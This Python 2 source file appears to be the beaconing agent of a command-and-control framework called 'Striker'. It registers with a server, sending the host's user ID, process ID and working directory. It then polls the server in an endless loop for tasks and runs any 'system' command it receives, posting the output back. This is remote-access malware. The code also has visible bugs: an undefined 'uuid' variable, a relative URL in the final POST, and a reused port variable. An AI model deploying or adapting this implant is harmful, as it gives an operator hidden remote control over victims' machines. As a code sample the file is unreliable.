#!/usr/bin/python

import sys, os, subprocess, requests, json, time

class Striker:

  def __init__(self, hosts):
    self.hosts = hosts
    self.server = {}
    self.config = {}


  def info(self):
    return {
      "uid": os.getuid(),
      "pid": os.getpid(),
      "wd": os.getcwd(),
      "os": os.name,
      "lang": "python"
    }

  def execTask(self, task):
    taskID = task['uid']
    data = task['data']
    result = "Not implemented!"
    if (task['type'] == "system"):
      cmd = data['cmd']
      proc = subprocess.Popen(cmd, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
      result = proc.stderr.read() + proc.stdout.read()
    return {"uid":taskID, "result":result}

  def main(self):
    for host in self.hosts:
      if (host['proto'] in ['http', 'https']):
        print("[+] Connecting to %s" %(host['host']));
        baseUrl = host['proto'] + "://" + host['host'] + ":" + str(host['port'])
        try:
          rsp = requests.post(baseUrl + "/agent/init", data=self.info())
          if (rsp.status_code != 200):
            print("[-] Non-200 response code!")
            continue
          data = json.loads(rsp.text);
          print(data)
          self.server = host
          self.config = data
        except Exception, e:
          print("[-] Error: " + str(e))
    if (self.server and self.server['proto'] in ['http', 'https']):
      baseUrl = self.server['proto'] + "://" + self.server['host'] + ":" + str(host['port'])
      uid = self.config['uid']
      delay = int(self.config['delay'])
      while True:
        time.sleep(delay / 1000.0)
        results = []
        rsp = requests.get(baseUrl + "/agent/tasks/" + uid)
        tasks = json.loads(rsp.text)
        for task in tasks:
          taskID = task['uid']
          result = self.execTask(task)
          results.append(result)
        if (len(results) > 0):
          rsp = requests.post("/agent/tasks/" + uuid, json=results)


if __name__ == '__main__':
  striker = Striker([{"proto": "http", "host":"127.0.0.1", "port":3000}])
  striker.main();
